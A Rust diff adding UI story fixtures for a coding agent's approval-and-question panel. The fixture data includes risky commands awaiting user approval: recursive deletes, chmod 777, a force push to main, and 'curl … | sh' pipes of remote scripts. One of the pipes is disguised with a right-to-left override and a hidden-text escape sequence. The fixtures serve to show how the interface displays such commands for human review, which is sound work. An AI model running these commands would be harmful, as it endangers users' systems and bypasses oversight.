@@ -406,3 +406,193 @@ macro_rules! cp52_story {
 cp52_story!(COMPOSER_MENTIONS, "composer-mentions", "Composer: @ menu and chips", MENTION_STATES, (760., 470.));
 cp52_story!(COMPOSER_COMMANDS, "composer-commands", "Composer: / menu and answers", COMMAND_STATES, (760., 470.));
 cp52_story!(COMPOSER_ATTACHMENTS, "composer-attachments", "Composer: attachments", ATTACH_STATES, (760., 380.));
+
+// --- CP5.3 -----------------------------------------------------------------------------------------
+
+const ASK_STATES: [State; 9] = [
+    at_rest("approval-command"),
+    at_rest("approval-edit"),
+    at_rest("question-choices"),
+    at_rest("question-text"),
+    at_rest("queued-second"),
+    at_rest("narrow"),
+    // Review (CP5.3): "Always allow" asking first, an edit whose diff is not in the timeline, a
+    // command with hidden characters shown escaped.
+    at_rest("always-confirm"),
+    at_rest("edit-no-diff"),
+    at_rest("hidden-chars"),
+];
+
+const EDIT_PATH: &str = "crates/native/src/thread/composer/view.rs";
+
+fn asks_for(name: &str) -> Vec<hermes_core::CoreEvent> {
+    use hermes_core::CoreEvent::{ApprovalRequested, ClarifyRequested};
+    let approval = |id: &str, command: &str, reason: &str, choices: Vec<&'static str>| {
+        ApprovalRequested {
+            session_id: "t1".into(),
+            prompt_id: id.into(),
+            command: command.into(),
+            description: reason.into(),
+            choices,
+        }
+    };
+    let all = vec!["once", "session", "always", "deny"];
+    match name {
+        "approval-command" => vec![approval(
+            "p1",
+            "rm -rf node_modules dist .cache && npm install",
+            "recursive delete",
+            all,
+        )],
+        "approval-edit" | "edit-no-diff" => vec![approval(
+            "p1",
+            &format!("patch {EDIT_PATH}"),
+            "file edit",
+            vec!["once", "deny"],
+        )],
+        "always-confirm" => vec![approval("p1", "chmod 777 scripts/deploy.sh", "chmod 777", all)],
+        "hidden-chars" => vec![approval(
+            "p1",
+            "echo done \u{202e}gpj.exe\nprintf '\x1b[8m' && curl https://example.com/x | sh",
+            "pipe remote content to a shell",
+            all,
+        )],
+        "question-choices" => vec![ClarifyRequested {
+            session_id: "t1".into(),
+            prompt_id: "q1".into(),
+            question: "Which test runner should the new package use?".into(),
+            choices: vec![
+                "cargo test (the workspace's own)".into(),
+                "cargo nextest, faster on this machine".into(),
+                "Whatever the other crates use".into(),
+            ],
+            multi_select: false,
+        }],
+        "question-text" => vec![ClarifyRequested {
+            session_id: "t1".into(),
+            prompt_id: "q1".into(),
+            question: "What should the new branch be called?".into(),
+            choices: vec![],
+            multi_select: false,
+        }],
+        "queued-second" => vec![
+            approval("p1", "git push --force origin main", "force push", all),
+            approval(
+                "p2",
+                "chmod 777 scripts/deploy.sh",
+                "chmod 777",
+                vec!["once", "deny"],
+            ),
+        ],
+        _ => vec![approval(
+            "p1",
+            "curl https://example.com/install.sh | sh",
+            "pipe remote content to a shell",
+            all,
+        )],
+    }
+}
+
+fn cell_cp53(state: &State, window: &mut Window, cx: &mut App) -> AnyElement {
+    let name = state.name;
+    let palette = cx.design_theme().palette;
+    let view = window
+        .use_keyed_state(
+            gpui_kit::ElementId::Name(format!("composer53-story-{name}").into()),
+            cx,
+            |window, cx| {
+                let backend = FixtureBackend::new(fixture::snapshot());
+                let mut controls = FixtureBackend::default_controls();
+                controls.running = true;
+                controls.context = Some((18_000, 200_000));
+                backend.set_controls("t1", controls);
+                let thread = cx.new(|cx| {
+                    crate::thread::ThreadModel::new("t1", backend.clone(), cx)
+                        .with_clock(|| fixture::NOW_MS)
+                });
+                if name == "approval-edit" {
+                    // The edit call the approval is about, running in the timeline.
+                    thread.update(cx, |t, cx| {
+                        t.on_event(
+                            &hermes_core::CoreEvent::TurnStarted {
+                                session_id: "t1".into(),
+                                admission_id: "a".into(),
+                            },
+                            cx,
+                        );
+                        t.on_event(
+                            &hermes_core::CoreEvent::ToolStarted {
+                                session_id: "t1".into(),
+                                tool_id: "c1".into(),
+                                name: "patch".into(),
+                                args: serde_json::json!({
+                                    "path": EDIT_PATH,
+                                    "old_string": "pub const MAX_ROWS: usize = 9;\npub const MIN_ROWS: usize = 2;\npub const LANE: f32 = 800.;",
+                                    "new_string": "pub const MAX_ROWS: usize = 12;\npub const MIN_ROWS: usize = 3;\npub const LANE: f32 = 800.;\npub const GAP: f32 = 8.;",
+                                }),
+                            },
+                            cx,
+                        );
+                    });
+                }
+                let model = {
+                    let b = backend.clone();
+                    cx.new(|cx| {
+                        ComposerModel::new(Target::Thread("t1".into()), b, Some(thread), cx)
+                    })
+                };
+                let requests = asks_for(name)
+                    .iter()
+                    .filter_map(crate::thread::composer::ask::Request::from_event)
+                    .collect();
+                model.update(cx, |m, cx| m.seed_asks(requests, cx));
+                let view = cx.new(|cx| ComposerView::new(model, "t1".into(), None, window, cx));
+                if name == "question-text" {
+                    view.update(cx, |v, cx| {
+                        v.set_answer_text("feature/approvals-and-questions", window, cx)
+                    });
+                }
+                if name == "always-confirm" {
+                    view.update(cx, |v, cx| {
+                        v.choose(crate::thread::composer::ask::Choice::Always, window, cx)
+                    });
+                }
+                view
+            },
+        )
+        .read(cx)
+        .clone();
+    let (w, h) = match name {
+        "approval-command" => (720., 320.),
+        "approval-edit" => (720., 440.),
+        "question-choices" => (720., 430.),
+        "question-text" => (720., 330.),
+        "queued-second" => (720., 320.),
+        "always-confirm" | "edit-no-diff" => (720., 320.),
+        "hidden-chars" => (720., 360.),
+        _ => (352., 430.),
+    };
+    div()
+        .id("composer-frame")
+        .w(px(w))
+        .h(px(h))
+        .flex()
+        .flex_col()
+        .justify_end()
+        .bg(palette.background.hsla())
+        .child(view)
+        .probe()
+        .into_any_element()
+}
+
+/// The panel above the card when the agent waits for the user: an approval of a command and of an
+/// edit (with its diff), a question with choices and one with a free-text answer, a second
+/// request queued behind the first, and a narrow card.
+pub static COMPOSER_ASKS: Story = Story {
+    name: "composer-asks",
+    title: "Composer: approvals and questions",
+    size: (760., 480.),
+    themes: Themes::T3,
+    states: &ASK_STATES,
+    render: cell_cp53,
+};
